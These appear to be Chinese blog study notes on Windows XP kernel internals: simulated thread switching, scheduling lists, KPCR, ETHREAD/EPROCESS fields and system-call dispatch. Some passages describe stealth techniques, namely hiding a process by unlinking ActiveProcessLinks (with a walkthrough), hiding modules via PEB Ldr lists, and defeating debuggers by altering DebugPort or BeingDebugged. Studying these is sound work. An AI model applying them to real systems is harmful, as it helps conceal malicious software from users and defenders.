线程调度函数回到主函数，线程注册函数执行完后（线程初始化函数中的线程调用函数并未执行，只是被压栈了，所以稍后分析），就到了线程调度函数，一起来看一下线程调度函数都做了些什么吧 c12345678910111213141516171819202122232425262728293031323334353637void Scheduling(void){ int i; int TickCount; GMThread_t* SrcGMThreadp; GMThread_t* DstGMThreadp; TickCount = GetTickCount(); //指向正在执行的线程 SrcGMThreadp = &GMThreadList[CurrentThreadIndex]; //指向准备执行的线程 DstGMThreadp = &GMThreadList[0]; //遍历线程数组，找到第一个状态为就绪的线程 for (i=1; GMThreadList[i].name; i++) { if (GMThreadList[i].Flags & GMTHREAD_SLEEP) { if (TickCount > GMThreadList[i].SleepMillisecondDot) { GMThreadList[i].Flags = GMTHREAD_READAY; } } if (GMThreadList[i].Flags & GMTHREAD_READAY) { DstGMThreadp = &GMThreadList[i]; break; } } //得到即将执行的线程下标 CurrentThreadIndex = DstGMThreadp - GMThreadList; //线程切换 SwitchContext(SrcGMThreadp, DstGMThreadp); } 线程调度函数不是很复杂，比较好理解，这里简要概括下： 开头部分定义了两个线程结构体指针：SrcGMThreadp，DstGMThreadp SrcGMThreadp指向正在运行的线程，DstGMThreadp遍历线程数组，找到第一个状态为就绪的线程并指向它 保存DstGMThreadp指向的线程在数组中的下标（下次调度时好知道，正在运行的线程位于什么位置） 通过SwitchContext将这两个线程进行切换 线程切换函数c1234567891011121314151617181920212223242526272829303132__declspec(naked) void SwitchContext(GMThread_t* SrcGMThreadp, GMThread_t* DstGMThreadp { __asm { push ebp mov ebp, esp push edi push esi push ebx push ecx push edx push eax mov esi, SrcGMThreadp mov edi, DstGMThreadp mov [esi + GMThread_t.KernelStack], esp //经典线程切换!!!本质是堆栈的切换！ mov esp, [edi + GMThread_t.KernelStack] pop eax pop edx pop ecx pop ebx pop esi pop edi pop ebp ret }} 这是本篇最高能的地方了，我们来详细分析一下，这个看上去简单的代码是如何实现线程切换的。我们来一步步的看： 最开始，一堆push，非常好理解，就是保存寄存器的值嘛！ 接下来，两个mov操作，将指向正在运行的线程结构体的指针赋给了esi，将指向准备运行的线程结构体的指针赋给了edi 然后，线程切换最经典的操作来了！将当前esp，赋值给esi指向线程的KernelStack；同时，将edi指向线程的KernelStack赋给esp。我们知道KernelStack存的是线程自己堆栈的esp，程序中的esp，是当前CPU执行的时的堆栈，而这个操作就是把当前堆栈保存到即将被切换的线程的KernleStack中，同时，让CPU执行所在的堆栈变成切换后的线程的KernelStack，说简单点，这个操作就是一次堆栈的切换！ 还没完！后面还有一堆pop，你以为就没用了嘛？仔细想想，堆栈已经发生了切换了！所以即将pop的那些值已经不是上面push进去的值了！那pop出来的值又是什么值呢？ 没错，就是在线程初始化函数中Push进去的那些值，一直到pop ebp都比较好理解 接下来，一个ret，又是一个精髓指令，通过这个ret指令，刚好调用一个用来执行线程的函数GMThreadStartup()，这个函数会让线程调用自己的线程函数。这里有一个细节，就是这个函数传递了一个线程结构体指针，但是在裸函数中，ret语句执行完就跳转到GMThreadStartup()函数的开始处执行，那么它又是如何获取参数的呢？我们来查看一下反汇编 根据这个函数的反汇编可以发现，它是通过[ebp+8]来获取参数的，而这个位置，刚好就是在初始化函数中，第一个push进去的线程结构体，紧接着push了一个9，仅仅是用来占位，从而使得[ebp+8]刚好可以指向线程结构体，从而获取参数，u1s1，这里细节妙不可言 这里贴一张群友张嘉杰做的笔记，做的非常好，结合着看更易看懂代码 执行线程函数c123456789void GMThreadStartup(GMThread_t* GMThreadp){ GMThreadp->func(GMThreadp->lpParameter); GMThreadp->Flags = GMTHREAD_EXIT; //线程切换 Scheduling(); return;} 这个函数，在上面刚讲过，主要就是最后，会再执行一次线程调度函数，实现下一次的线程切换，说明了一点，线程是主动切换的，主动让出CPU 程序运行结果最后，来看一下程序运行时的样子，就是在不断的线程切换 总结至此，程序主要部分就基本分析完毕，真的是非常巧妙的代码，海东老师太厉害了！这里对模拟线程切换做一个总结： 线程不是被动切换的，而是主动让出CPU 线程切换并没有使用TSS来保持寄存器，而是使用堆栈。 线程切换的过程就是切换堆栈的过程 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=47 参考文章： https://blog.csdn.net/qq_38474570/article/details/104245111 https://blog.csdn.net/qq_41988448/article/details/103098367 参考笔记：张嘉杰，Joney，米高扬设计局，馍馍","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"等待链表&调度链表","slug":"等待链表-调度链表","date":"2020-03-30T15:38:42.000Z","updated":"2020-03-30T16:28:53.447Z","comments":true,"path":"2020/03/30/等待链表-调度链表/","link":"","permalink":"http://cata1oc.github.io/2020/03/30/%E7%AD%89%E5%BE%85%E9%93%BE%E8%A1%A8-%E8%B0%83%E5%BA%A6%E9%93%BE%E8%A1%A8/","excerpt":"","text":"在前面介绍进程结构体时，进行了断链实验，程序可以正常运行，原因是CPU执行与调度的单位是线程，因此进程的断链并不影响程序的正常执行。对线程的断链也是一样的，断链后虽然可以隐藏断掉的线程，但同样不影响程序的执行。这说明，CPU调度时根本没有用到ThreadListEntry这个链表。接下来介绍两个与调度相关的链表：等待链表&调度链表 33个链表 线程有3种状态：就绪、等待、运行 正在运行中的线程存储在KPCR中，就绪和等待的线程全在另外的33个链表中。包括1个等待链表，32个就绪链表 这些链表都使用了_KTHREAD+0x060这个位置（如果是Win7的话，位于KTHREAD+0x074的位置），也就是说，线程在某一时刻，只能属于其中一个链表内 等待链表 查询指令：dd KiWaitListHead 说明： 等待链表是一个双向链表 当线程调用了Sleep()或者WaitForSingleObject()等函数时，就挂到这个链表 结构图： 关系梳理：KiWaitListHead -> WaitListEntry(KTHREAD+0x60) -> ThreadProcess(ETHREAD+0x220) -> EPROCESS 调度链表 查询指令：dd KiDispatcherReadyListHead L70 说明： 调度链表共32个双向链表 有32个调度链表的原因是，运行中的线程是有线程优先级，根据下标表示线程优先级别（0~31） 32位系统中，调度链表有32个（一组），64位系统则有64个（一组） 普通操作系统，只有一组调度链表，服务器版本系统中，调度链表的数量等于CPU的数量，但等待链表只有一个 结构图： 总结 正在运行的线程位于KPCR中 准备运行的线程根据线程优先级的不同，分布在32个调度链表中； KiDispatcherReadyListHead是个数组，存储了32个链表头 等待状态的线程存储在等待链表里，KiWaitListHead存储了链表头 这些圈均挂在KTHREAD+0x060的位置（XP系统）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"KPCR","slug":"KPCR","date":"2020-03-30T01:06:50.000Z","updated":"2020-03-30T15:22:42.805Z","comments":true,"path":"2020/03/30/KPCR/","link":"","permalink":"http://cata1oc.github.io/2020/03/30/KPCR/","excerpt":"","text":"进程在内核中对应结构体：EPROCESS 线程在内核中对应结构体：ETHREAD CPU在内核中也有一个对应的结构体：KPCR（Processor Control Region） KPCR结构我们已经很熟悉了，在API函数的调用过程中，多次使用到了KPCR，也简要介绍过一点。在保存现场之前有一个步骤就是将fs寄存器写入0x30，并根据GDT表，让fs寄存器指向KPCR。 KPCR介绍 当线程进入0环时，FS:[0]指向KPCR（3环时FS:[0] -> TEB） 每个CPU都有一个KPCR结构体（一个核一个） KPCR中存储了CPU本身要用的一些重要数据：GDT、IDT以及线程相关的一些信息。 在Windbg中执行指令：dt _KPCR 查看KPCR结构 结构图： KPCR成员+0x000 NtTib 成员名：NtTib 数据类型：_NT_TIB 说明：KPCR的第一个成员，存储部分关键信息（TEB的第一个成员也是这个结构） 结构图： +0x000 ExceptionList 成员名：ExceptionList 数据类型：Ptr32 _EXCEPTION_REGISTRATION_RECORD 说明：指向当前线程的异常链表（SEH），包含了当前线程的异常处理函数。Ring0（KPRC的ExceptionList）和Ring3（TEB的ExceptionList）的异常处理函数不同 +0x004 StackBase/+0x008 StackLimit 成员名：StackBase/StackLimit 数据类型：Ptr32 Void 说明：当前线程内核栈的基址和大小（KPCR中的是Ring0相关，TEB中就是Ring3相关） +0x018 Self 成员名：Self 数据类型：Ptr32 _NT_TIB 说明：指向自己（也就是指向_NT_TIB结构）这样设计的目的是为了查找方便。Ring0->KPCR，Ring3->TEB +0x01c SelfPcr 成员名：SelfPcr 数据类型：Ptr32 _KPCR 说明：指向自己，方便寻址 +0x020 Prcb 成员名：Prcb 数据类型：Ptr32 _KPRCB 说明：指向扩展结构体KPRCB +0x038 IDT 成员名：IDT 数据类型：Ptr32 _KIDTENTRY 说明：指向IDT表首地址 +0x03c GDT 成员名：GDT 数据类型：Ptr32 _KGDTENTRY 说明：指向GDT表首地址 +0x040 TSS 成员名：TSS 数据类型：Ptr32 _KTSS 说明：指向TSS，每个CPU都有一个TSS +0x051 Number 成员名：Number 数据类型：UChar 说明：CPU编号 +0x120 PrcbData 成员名：PrcbData 数据类型：_KPRCB 说明：KPCR的扩展结构体 结构图： KPRCB结构体KPRCB（Kernel Processor Control Block）是KPCR的扩展结构体 +0x004 CurrentThread成员名：CurrentThread 数据类型：Ptr32 _KTHREAD 说明：指向当前线程的KTHREAD +0x008 NextThread成员名：CurrentThread 数据类型：Ptr32 _KTHREAD 说明：指向下一个要执行线程的KTHREAD +0x00c IdleThread成员名：IdleThread 数据类型：Ptr32 _KTHREAD 说明：指向空闲线程的KTHREAD +0x88c QuantumEnd成员名：QuantumEnd 数据类型：Uint4B 说明：CPU时间片标志 关系梳理在简单了解完进程结构体（EPROCESS）、线程结构体（ETHREAD）、CPU结构体（KPCR）以后，来梳理一下它们之间的关系。 已知进程遍历进程：PsActiveProcessHead -> ActiveProcessLinks(EPROCESS+0x88)…… 遍历线程：PsActiveProcessHead -> ActiveProcessLinks(EPROCESS+0x88) -> ThreadListHead(KPROCESS+0x50 / EPROCESS+0x190) -> ThreadListEntry(KTHREAD+0x1b0 / ETHREAD+0x22c)…… 已知线程遍历进程：ETHREAD+0x220 -> EPROCESS -> ActiveProcessLinks(EPROCESS+0x88)…… 遍历线程：ETHREAD+0x22c / ETHREAD+0x1b0 -> ThreadListEntry…… 已知KPCR遍历进程：进入0环后 -> fs:[0] -> KPCR -> PrcbData(KPCR+0x120) -> CurrentThread(KPRCB+0x4) -> EPROCESS(ETHREAD+0x220) -> ActiveProcessLinks(EPROCESS+0x88)…… 遍历线程：进入0环后 -> fs:[0] -> KPCR -> PrcbData(KPCR+0x120) -> CurrentThread(KPRCB+0x4) -> ETHREAD+0x22c / ETHREAD+0x1b0 -> ThreadListEntry…… 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=45 参考文档：张嘉杰笔记","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"线程结构体","slug":"线程结构体","date":"2020-03-29T09:01:47.000Z","updated":"2020-03-30T15:22:17.474Z","comments":true,"path":"2020/03/29/线程结构体/","link":"","permalink":"http://cata1oc.github.io/2020/03/29/%E7%BA%BF%E7%A8%8B%E7%BB%93%E6%9E%84%E4%BD%93/","excerpt":"","text":"Windows中每个进程会包含一个或多个线程，每个线程在0环都有一个对应的结构体：ETHREAD，这个结构体包含了线程所有重要的信息，下面来简单了解一下。 ETHREADWindbg中，执行dt _ETHREAD可以看到这个完成的结构： +0x000 Tcb 成员名：Tcb 数据类型：_KTHREAD Windbg查询指令：dt _KTHREAD 结构图： 说明：KTHREAD这个结构应该已经比较眼熟了，在API函数的调用过程（保存现场），就多次用到了KTHREAD结构里的成员。 +0x000 Header 成员名：Header 数据类型：_DISPATCHER_HEADER 说明：结构体内若包含_DISPATCHER_HEADER这个数据类型，说明这是一个可等待对象 可等待对象：Mutex，Event都是可等待对象，可被作用于WaitForSingleObject这类函数 +0x018 InitialStack/+0x01c StackLimit/+0x028 KernelStack 成员名：InitialStack/StackLimit/KernelStack 数据类型：Ptr32 Void 说明：这三个成员与线程切换有关。有印象的话，在分析KiFastCallEntry函数保存现场的过程中，曾有一行代码获取了InitialStack的值，并存到了ebp中。 此外，线程切换发生时，会根据KernelStack修改TSS的ESP0。更多关于这三个成员的用法，会在后面线程切换的地方再提到 +0x020 Teb 成员名：Teb（Thread Environment Block），线程环境块 数据类型：Ptr32 Void 大小：4KB 结构图： 说明： 0x20位置存着一个指向Teb结构的指针 Teb是在3环用来描述线程的一个结构。 0环时，FS:[0]指向KPCR；3环时，FS:[0]指向TEB +0x02c DebugActive 成员名：DebugActive 数据类型：UChar 说明：在分析KiSystemService进行保存现场的过中遇到过，若这个位置的值不是-1，说明处于调试状态，程序会跳转到执行一个将Dr0~Dr7保存到_Trap_Frame里面的操作。从而衍生出了一个反调试手段，将这个位置的值置为-1，从而不能使用8个调试寄存器 +0x02d State 成员名：State 数据类型：UChar 说明：线程状态-就绪/等待/运行 +0x060 WaitListEntry/SwapListEntry 成员名：WaitListEntry/SwapListEntry 数据类型：WaitListEntry为_LIST_ENTRY / SwapListEntry为 _SINGLE_LIST_ENTRY 说明：此处为Wait链表或Ready链表。Windows线程总是处于Wait/Running/Ready这三种状态之一 +0x06c BasePrioirty 成员名：BasePriority 数据类型：Char 说明：其初始值是所属进程的BasePrioirty值（KPROCESS->BasePriority），以后可以通过KeSetBasePriorityThread()函数重新设定 +0x070 WaitBlock 成员名：WaitBlock 数据类型：[4]_KWAIT_BLOCK 说明：当前线程，正在等待哪个可等待对象（WaitForSingleObject）这个可等待对象的信息就会被写入这个_KWAIT_BLOCK结构的数组里。 +0x0E0 ServiceTable 成员名：ServiceTable 数据类型：Ptr32 Void 说明：这个应该很熟悉了，指向系统服务表基址；通过系统服务表，可以找到函数地址表，根据系统服务号提供的偏移，就可以在函数地址表中找到3环API接口对应的0环内核函数 +0x134 TrapFrame 成员名：TrapFrame 数据类型：Ptr32 _KTRAP_FRAME 说明：这个也很熟悉了，进0环时，保存现场的原理就是填充寄存器及相关数据到TrapFrame结构中，最后更新TrapFrame位置的值，使其指向新保存的TrapFrame +0x140 PerviousMode 成员名：PerviousMode 数据类型：Char 说明：在调用0环函数，保存现场的过程时，会将先前模式保存到TrapFrame结构中，以便根据先前模式，能够正确的返回到调用它的函数。 +0x1b0 ThreadListEntry 成员名：ThreadListEntry 数据类型：_LIST_ENTRY 说明： 双向链表，一个进程所有的线程，都挂在一个链表中，挂的就是这个位置 链表头位于KPROCESS+0x50的位置以及EPROCESS+0x194的位置，相当于ThreadListEntry的PsThreadListHead 一共有两个这样的链表 APC相关（位于KTHREAD内） 成员位置 成员名 数据类型 0x034 ApcState _KAPC_STATE +0x0e8 ApcQueueLock Uint4B +0x138 ApcStatePointer [2] Ptr32 _KAPC_STATE +0x14c SavedApcState _KAPC_STATE 说明：这些均为与APC相关的结构，具体到APC章节再做分析，这里仅作了解 +0x1ec Cid 成员名：Cid 数据类型：_CLIENT_ID 说明：共八字节，包含两个值，当前进程的PID和当前线程的CID 结构图： +0x220 ThreadProcess 成员名：ThreadProcess 数据类型：Ptr32 _EPROCESS 说明：指向自己所属进程 +0x22c ThreadListEntry 成员名：ThreadListEntry 数据类型：_LIST_ENTRY 说明： 双向链表，一个进程所有的线程，都挂在一个链表中，挂的就是这个位置 链表头位于KPROCESS+0x50的位置以及EPROCESS+0x194的位置，相当于ThreadListEntry的PsThreadListHead 一共有两个这样的链表 这个双向链表的内容和0x1b0位置的完全一样，构建2个双向链表主要是为了方便，一个位于KPROCESS内，一个位于EPROCESS内 结构图： 关于断链在进程结构体中，我们通过断链实现了简单的进程隐藏，其原理在于，任务管理器在查询进程便是通过遍历ActiveProcessLink实现的。尽管进程已经不在活动进程链表上，但是仍然可以运行，原因是Windows调度的基本单位是线程，而不是进程，所以才有从进程链表上摘除自身进程的隐藏方法，这虽然从进程链表上摘除了自身，但不会影响操作系统的调度，所以不影响程序运行。 不过这里没能完成线程断链的实验，原因可能在于VMware虚拟机的指令问题，Windbg无法中断操作系统时间过长，所以经常实验到一半，就无法继续执行指令了，只能重启虚拟机，后续到驱动章节会此实验作为练习补上。 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=44 参考文章：https://blog.csdn.net/emaste_r/article/details/8916786 参考笔记：张嘉杰的笔记","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"进程结构体","slug":"进程结构体","date":"2020-03-28T15:50:13.000Z","updated":"2020-03-30T01:46:19.225Z","comments":true,"path":"2020/03/28/进程结构体/","link":"","permalink":"http://cata1oc.github.io/2020/03/28/%E8%BF%9B%E7%A8%8B%E7%BB%93%E6%9E%84%E4%BD%93/","excerpt":"","text":"进程，站在内核的角度来说，它就是个结构体。当操作系统想要创建一个进程时，本质上就是分配一块内存，填充一个结构体，今天就来了解一下这个进程结构体EPROCESS。 EPROCESS每个Windows进程在0环都有一个对应的结构体：EPROCESS，这个结构体包含了进程所有重要的信息。 在Windbg中，执行指令dt _EPROCESS 我们就可以看到这个完整的结构。 这个结构非常的庞大，本篇先混个眼熟，介绍一些比较关键的字段，其余在后续文章中用到时再详细介绍。 +0x000 Pcb 成员名：Pcb 数据类型：_KPROCESS 说明：在EPROCESS开始的位置，有一个Pcb，它是一个KPROCESS结构，同样包含了描述进程的信息，先来看一下这个结构比较关键的一些字段。 结构图： +0x000 Header 成员名：Header 数据类型：_DISPATCHER_HEADER 说明：结构体内若包含_DISPATCHER_HEADER这个数据类型，说明这是一个可等待对象 可等待对象：Mutex，Event都是可等待对象，可被作用于WaitForSingleObject这类函数 +0x018 DirectoryTableBase 成员名：页目录表基址 数据类型：[2] Uint4B 说明：进程结构体中最重要的成员，控制整个进程的物理页，进程切换时会将值填入Cr3 +0x038 KernelTime/+0x03c UserTime 成员名：KernelTime/UserTime 数据类型：Uint4B 说明：统计信息，记录了一个进程在内核模式/用户模式下所花的时间 +0x050 ThreadListHead 成员名：ThreadListHead 数据类型：_LIST_ENTRY 说明：指向当前进程的，线程链表 +0x05c Affinity 成员名：Affinity 数据类型：Uint4B 说明：规定进程里面的所有线程能在哪个CPU上跑 如果值为1，那这个进程的所有线程只能在0号CPU上跑（00000001） 如果值为3，那这个进程的所有线程能在0、1号CPU上跑（000000011） 如果值为4，那这个进程的所有线程能在2号CPU上跑（000000100） 如果值为5，那这个进程的所有线程能在0，2号CPU上跑（000000101） 4个字节共32位，所以最多只能32核，Windows64位，就64核；如果只有一个CPU，把这个值设置为4，那么这个进程就死了。 +0x062 BasePriority 成员名：BasePriority 数据类型：Char 说明：表示基础优先级/最低优先级，该进程中的所有线程一创建出来时最初的优先级 到这里KPROCESS内部的主要成员就介绍完了，现在又要回到EPROCESS这个结构中了 +0x063 ThreadQuantum 成员名：ThreadQuantum 数据类型：Char 说明：线程时间片的初始值 +0x070 CreateTime/+0x078 ExitTime 成员名：CreateTime/ExitTime 数据类型：_LARGE_INTEGER 说明：进程的创建/退出时间 +0x084 UniqueProcessId 成员名：UniqueProcessId 数据类型：Ptr32 Void 说明：进程的编号，任务管理器中显示的PID就是这个值 +0x088 ActiveProcessLinks 成员名：ActiveProcessLinks 数据类型：_List_Entry 说明：双向链表，所有的活动进程都连接在一起，构成了一个链表 PsActiveProcessHead指向全局链表头 第一个成员指向后一个进程结构体0x88偏移的位置，第二个成员指向前一个结构体0x88偏移的位置 通过断链，可以实现简单的进程隐藏 结构图： 查询示范： +0x090 QuotaUsage/+0x09c QuotaPeak 成员名：QuotaUsage/QuotaPeak 数据类型：[3] Uint4B 说明：物理页相关的统计信息（到内存部分会详细分析） +0x0a8 CommitCharge/+0x0ac PeakVirtualSize/+0x0b0 VirtualSize 成员名：CommitCharge/PeakVirtualSize/VirtualSize 数据类型：Uint4B 说明：虚拟内存相关的统计信息（到内存部分会详细分析） +0x11c VadRoot 成员名：VadRoot 数据类型：Ptr32 Void 说明：指向一个平衡二叉树，标识了0~2G哪些内存被分配了，哪些没被分配；该成员和内存遍历，模块隐藏有关 +0x0bc DebugPort /+0x0c0 ExceptionPort 成员名：DebugPort/ExceptionPort 数据类型：Ptr32 Void 说明：调试相关，通过清零DebugPort，是一种简单的反调试手段，具体关于调试的内容，到调试相关章节会详细分析 +0x0c4 ObjectTable 成员名：ObjectTable 数据类型：Ptr32 _HANDLE_TABLE 说明：句柄表，存储在0环，记录了当前进程所使用的别的进程的句柄地址，可以通过遍历所有进程的句柄表来查看当前程序是否被调试。在句柄表的章节，会详细讲解这个成员的内容 +0x174 ImageFileName 成员名：ImageFileName 数据类型：[16]UChar 说明：进程镜像文件名，最多16个字节。如上面查询活动进程链表的实验中，可以看到进程名为”System” 0x1a0 ActiveThreads 成员名：ActiveThreads 数据类型：Uint4B 说明：活动线程的数量 0x1b0 Peb 成员名：Peb 数据类型：Ptr32_PEB 说明：PEB（Process Enviroment Block 进程环境快）：位于3环的一个描述进程的结构，里面包含了进程的模块列表、是否处于调试状态，等信息 结构图： 下面简单介绍其中2个成员： 0x2 BeingDebugged 成员名：BeingDebugged 数据类型：Uchar 说明：当进程属于被调试的时候，这个位置的值会被置1。调试器可以通过不断清零这个值，做到简单的反反调试 0xc Ldr 成员名：Ldr 数据类型：_PEB_LDR_DATA 该结构内有3个双向链表成员，存储了当前进程所有的模块（只是顺序不同），通过断链可以实现简单的模块隐藏 结构图： 进程隐藏在前面介绍了EPROCESS里有一个双向链表ActiveProcessLinks，我们可以通过断链，实现简单的进程隐藏。 打开OD，然后打开任务管理器，可以看到，OD这个进程 然后找到活动进程链表头 从后往前遍历（刚打开的进程，位于链表靠后的位置），找到OD这个进程对应的EPROCESS 修改OD前后进程结构体的活动进程链表，将OD断链 再次打开任务管理器，发现没有OD这个进程了，但是程序仍能正常执行 说明任务管理器是通过遍历活动进程链表来查询所有进程的 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=43 参考文章： https://blog.csdn.net/qq_41988448/article/details/103005060 https://blog.csdn.net/qq_38474570/article/details/103722984","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"API函数的调用过程（系统服务表）","slug":"API函数的调用过程（系统服务表）","date":"2020-03-27T15:49:50.000Z","updated":"2020-03-29T13:08:03.028Z","comments":true,"path":"2020/03/27/API函数的调用过程（系统服务表）/","link":"","permalink":"http://cata1oc.github.io/2020/03/27/API%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%88%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E8%A1%A8%EF%BC%89/","excerpt":"","text":"前面的学习过程中，我们了解到程序进入0环后，有一个保存现场的过程，会将3环的各种寄存器都保存到一个叫做_Trap_Frame的结构体中。在3环部分，程序将一个编号存到了eax中，这个编号叫做系统服务号，此外，在保存现场的过程中，程序还让edx指向了3环第一个参数的地址。回忆起这两步，接下来，就可以继续探究执行内核函数的过程了。 系统服务表在分析代码前，我们先来学习一个结构，系统服务表（System Service Table） 在Windows XP系统下，系统服务表有两张，这两张表存着内核文件的导出函数（不包括内核文件的所有函数，主要是3环函数常用的内核函数）。第一张表导出的内核函数主要来源于ntoskrl.exe，实现大部分3环函数基本功能；第二张表导出的内核函数主要来源于win32k.sys，主要实现图形界面相关功能（例如GDI32.dll的底层实现）。 系统服务表结构根据示例图，我们先简单认识一下系统服务表，先从结构看起： ServiceTable：指向一个函数地址表，通过系统服务号可以在函数地址表中找到指定的内核函数。 Count：指当前系统服务表被调用的次数。 ServiceLimit：函数地址表的大小，即系统服务函数的个数 ArgmentTable：系统服务函数参数的大小，以字节为单位，每个成员大小为1个字节。 系统服务表位置这个系统服务表位于KTHREAD结构的0xE0偏移处。这样，在进入0环后我们可以通过fs:[0]找到KPCR结构，然后在KPCR->0x124找到当前线程的KTHREAD结构，再根据KTHREAD->0xE0就可以找到当前线程所拥有的系统服务表。 Code1fs:[0] -> KPCR -> KPCR+0x124 -> KTHREAD -> KTHREAD+0xE0 -> 系统服务表 系统服务号系统服务号用来定位所要寻找的系统服务表的函数。 系统服务号只有低13位是有用的 下标12：判断去查服务表，0去查第一张表；1去查第二张表 下标0~11：函数地址表的索引 SharedCode分析在前面保存现场的代码分析中，由于进入0环的方式不同，中断进0环（int 2E）和快速调用（sysenter）保存现场的方式也不一样，但是当这两种方式，将寄存器保存到_Trap_Frame结构中以后（保存现场），便会从同一个地放（KiFastCallEntry+0x8D）开始执行，我们把这一部分共同的代码称作SharedCode（引用Joney的文中的称呼），接下来，我们简要分析一下SharedCode到底做了什么事。 这里还是将代码放在一起分析，更有连贯性，具体细节可以到Windbg中动手实现 Code12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455804df781 8bf8 mov edi,eax //eax保存的是系统服务号(参考3环部分)，edi获804df781 //取服务号804df783 c1ef08 shr edi,8 //将edi右移8位，系统服务号只用到13位，这样还804df783 //剩下5位804df786 83e730 and edi,30h //将余下的5位与0x30(0011 0000)进行与804df786 //算,得到的结果只有可能是0x10或者0，这里非常巧804df786 //妙，因为0x10刚好是16个字节804df789 8bcf mov ecx,edi //将与后的结果，赋值给ecx804df78b 03bee0000000 add edi,dword ptr [esi+0E0h] //esi指向KTHREAD，[esi+0xE]就算获取到第一个系804df78b //统服务表的首地址，然后加上edi。这里如果edi的804df78b //值是0x10，运算后，edi就会指向第二个系统服务804df78b //表的首地址，所以上一步的与运算很巧妙804df791 8bd8 mov ebx,eax //ebx获取服务号804df793 25ff0f0000 and eax,0FFFh //对服务号进行与运算，因为上面的步骤已经确定了804df793 //从哪一个系统服务表里找，这里将下标12的位置零804df793 //，获取在函数地址表里的索引804df798 3b4708 cmp eax,dword ptr [edi+8] //[edi+8]指向ServiceLimit，这里与系统服务号作804df798 //比较，防止系统符服务号越界804df79b 0f8341fdffff jae nt!KiBBTUnexpectedRange (804df4e2) //若越界则跳转异常处理804df7a1 83f910 cmp ecx,10h //这里判断系统服务号属于哪个表(虽然前面的步骤判804df7a1 //断过一次了，前面是为了判断服务号是否越界，这804df7a1 //里主要是找到合适的处理函数)804df7a4 751a jne nt!KiFastCallEntry+0xcc (804df7c0) //若不等，就跳转到处理查找第一个系统服804df7a4 //务表的例程804df7a6 8b0d18f0dfff mov ecx,dword ptr ds:[0FFDFF018h] //若要去查找第二个系统服务表，从这里走，不作详细804df7a6 //分析804df7ac 33db xor ebx,ebx804df7ae 0b99700f0000 or ebx,dword ptr [ecx+0F70h]804df7b4 740a je nt!KiFastCallEntry+0xcc (804df7c0)804df7b6 52 push edx804df7b7 50 push eax804df7b8 ff1564b25580 call dword ptr [nt!KeGdiFlushUserBatch (8055b264)]804df7be 58 pop eax804df7bf 5a pop edx804df7c0 ff0538f6dfff inc dword ptr ds:[0FFDFF638h] //如果查第一个表，会跳到这里来 [0xffdff638]804df7c0 //KPRCB结构的0x518偏移处，存的是KeSystemCalls804df7c0 //，这里自增1(具体用处到APC那块会讲到)804df7c6 8bf2 mov esi,edx //edx存着3环第一个参数的地址，赋给esi804df7c8 8b5f0c mov ebx,dword ptr [edi+0Ch] //ebx获取函数参数表地址804df7cb 33c9 xor ecx,ecx //清空ecx，之前用来判断寻找哪个系统服务表804df7cd 8a0c18 mov cl,byte ptr [eax+ebx] //cl获取函数参数个数804df7d0 8b3f mov edi,dword ptr [edi] //另edi直接指向函数地址表首地址804df7d2 8b1c87 mov ebx,dword ptr [edi+eax*4] //ebx获取到0环实现的内核函数804df7d5 2be1 sub esp,ecx //提升堆栈，ecx里存的是参数个数的总字节804df7d7 c1e902 shr ecx,2 //相当于运算ecx/4，方便rep movsd，因为rep804df7d7 //movsd是4字节运算804df7da 8bfc mov edi,esp //rep movsd指令用，Copy的目的地804df7dc 3b35d40b5680 cmp esi,dword ptr [nt!MmUserProbeAddress (80560bd4)]//检测三环参数地址范围是否越界804df7e2 0f83a8010000 jae nt!KiSystemCallExit2+0x9f (804df990) //若越界，进行异常处理804df7e8 f3a5 rep movs dword ptr es:[edi],dword ptr [esi] //将参数复制到堆栈804df7ea ffd3 call ebx //调用0环函数！804df7ec 8be5 mov esp,ebp804df7ee 8b0d24f1dfff mov ecx,dword ptr ds:[0FFDFF124h]804df7f4 8b553c mov edx,dword ptr [ebp+3Ch]804df7f7 899134010000 mov dword ptr [ecx+134h],edx 至此，这块KiFastCallEntry和KiSystemService最终都会执行的一段被我们称作SharedCode的代码段，就分析完了， SSDT前文提到了，我们可以通过fs找到KPCR，在通过KPCR找到KTHREAD，然后在KTHREAD+0xE0处找到系统服务表，这里再介绍另一种找到系统服务表的办法，通过SSDT。 SSDT&SSDT ShadowSSDT（System Services Descriptor Table）系统服务描述符表，在这个结构中包含4个成员，每个成员都是一个系统服务表的结构体，可以在Windbg中通过dd KeServiceDescriptorTable指令进行查看（在程序中可以直接声明全局变量KeServiceDescriptorTable，从而找到找到系统服务表。）： 我们可以看到第一个成员的ServiceTable，Count，ServiceLimit，ArgmentTable字段，Windows Xp只使用了2张表，所以第三个和第四个成员的位置是空的，此外，由于SSDT第二个成员是未导出的，所以第二个成员的位置也是空的。这里介绍一个新的指令，dd KeServiceDescriptorTableShadow，通过全局变量KeServiceDescriptorTableShadow可以查看两张完整的系统服务表。 但是，全局变量KeServiceDescriptorTableShadow也是未导出的，在实际写程序时，不能通过直接访问win32k.sys导出的第二张系统服务表的函数地址，因为里面的函数地址都是无效的。原因是，win32k.sys导出的第二张系统服务表只有在当前进程访问GDI相关的API时，里面的函数地址表才会挂载到物理页上。如果进程没有用到GDI相关的API，那么第二张系统服务表里面的函数地址表就不会挂载到物理内存，那么里面的函数也无效。 